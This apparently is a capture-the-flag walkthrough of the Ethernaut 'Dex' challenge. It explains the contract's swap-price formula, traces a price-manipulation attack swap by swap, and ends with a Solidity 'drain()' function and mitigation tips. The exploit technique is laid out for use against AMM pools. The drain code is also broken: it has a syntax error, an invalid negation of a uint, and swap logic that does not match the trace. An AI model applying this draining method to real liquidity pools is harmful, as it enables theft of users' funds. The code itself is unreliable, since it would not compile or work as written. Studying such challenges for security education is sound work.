# Ethernaut Walkthrough: Dex
## Welcome to KweenBirb's 23rd installment of Ethernaut walkthroughs!

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to Dex.sol, the 23rd challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt file in this directory and the .sol file in the src directory. Let's begin!

OpenZeppelin instructs us 'to hack the basic DEX contract below and steal the funds by price manipulation.` They later elaborate that the goal is to 'drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.'

Okay, wow! We're in the big leagues now huh? DeFi exploits on AMM liquidity pools! Let's get going, then.

## 







Swap price mechanism:

swap price is calculated by dividing newtoken balance by oldtoken balance, multiplied by amount of oldtoken supplied (where balances are this contract's):

function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}

in essence, where new is desired token and old is dumped token:

swapAmount = suppliedAmount * newBalance/oldBalance


Swap function mechanism:

swap function executes as following: 
1. limits parameters to only accept the two storage variables that store tokens for this pool;
2. checks to ensure msg.sender has enough old tokens to call function with provided uint amount
3. call function to set swapAmount = suppliedAmount * newBalance/oldBalance
4. call transferFrom on oldToken, transferring user-specified amount to dump into this contract pool
5. call approve on newToken, allowing this contract to spend swapAmount of desired token
6. call transferFrom on newToken, transferring previously approved swapAmount to msg.sender, completing the (d)exchange

function swap(address from, address to, uint amount) public {
    // limit this function execution to the two token addresses in storage
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    // ensure that msg.sender balance of tokens to dump is sufficient
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    // set swap price
    uint swapAmount = getSwapPrice(from, to, amount);
    // call transferFrom on oldToken, pulling supplied amount from msg.sender into this contract pool
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    // call approve on newToken, approving swapAmount for this contract to spend
    IERC20(to).approve(address(this), swapAmount);
    // call transferFrom on newToken, pushing swapAmount to msg.sender
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}


NOTE! XXX not solution
getSwapPrice() has NO REQUIRE CHECK and is PUBLIC; balanceOf() same thing too!
idea: deploy malicious erc20 contract, assign instance contract balanceOf() to return high and hacker balanceOf() to return low
doesn't work because parameters are sanitized by swap() require and then passed around- cannot change them within swap()


NOTE!
addLiquidity function is onlyOwner! hacker cannot add liquidity directly... therefore if our goal is to manipulate price and exploit getSwapPrice() we can not use addLiquidity()
but instead can change balanceOf(address(this)) underhandedly, in a way the dex doesn't expect:

    transfer() 10token1 to contract -> IERC20(token1).balanceOf(address(this)) == 110
        contract: 100 100 -> 110 100
        hacker:   10  10  -> 0   10
    therefore: swapAmount = 10 * 110 / 100  // 1.1 ratio means hacker can obtain 11token1 in exchange for 10token2
        contract: 110 100 -> 99 110
        hacker:   0   10  -> 11 0
    
    swap again:
    swapAmount = 11 * 110 / 99  // == 12.2 so hacker can exchange 11token1 for 12.2token2
        contract: 99 110 -> 110 97.8
        hacker:   11 0   -> 0   12.2

    again:
    swapAmount = 12.2 * 110 / 97.8  // == 13.7 so hacker can exchange 12.2token2 for 13.7token1
        contract: 110 97.8 -> 96.3 110
        hacker:   0   12.2 -> 13.7 0

    again:
    swapAmount = 13.7 * 110 / 96.3  // == 15.6 so hacker can exchange 13.7token1 for 15.6token2
        contract: 96.3 110 -> 110 94.4
        hacker:   13.7 0   -> 0   15.6

    again:
    swapAmount = 15.6 * 110 / 94.4  // == 18.2
        contract: 110 94.4 -> 91.8 110
        hacker:  0   15.6 -> 18.2 0

    again:
    swapAmount = 18.2 * 110/ 91.8  // == 21.8

You get the point- by causing an initial imbalance of assets in the pool, we can bundle repeated swap calls to leverage the imbalance so that it expands, draining the entire balance of one side of the pool. Abstracted into a repeatable equation, these operations can be represented as follows:

a = 10 * 110 / 100 // 11
a = 11 * 110 / 99 // 12.2
a = 12.2 * 110 / 97.8 // 13.7

f(b) = a * 110 / (110-a) // where a == f(b - 1)
thus:
f(a) = f(a-1) * 110 / (110 - f(a-1))


function to do precisely that:

Dex dex = Dex($your_ethernaut_instance_here);
address public token1 = $your_token1_address_here;
address public token2 = $your_token2_address_here;

function drain()) public {
    IERC20(token1).transfer(dex, 10);  // send 10token1 to dex contract
    while (dex.balanceOf(token1, dex) > 0 || dex.balanceOf(token2, dex) > 0) {
        
        balance = dex.balanceOf(token1, msg.sender);
        if (!balance) { 
            balance = dex.balanceOf(token2, msg.sender);
            dex.swap(token2, token1, balance);
        }

        dex.swap(token1, token2, balance);

    }
}

suggestions for improvement:
never rely on 
1. centralized data sources for price and liquidity calculations
2. recordkeeping via ```address(this)``` as it can be circumvented with transfers or selfdestruct()

implement decentralized oracle data feeds like those of Chainlink to replace ```balanceOf(address(this))``` calls.
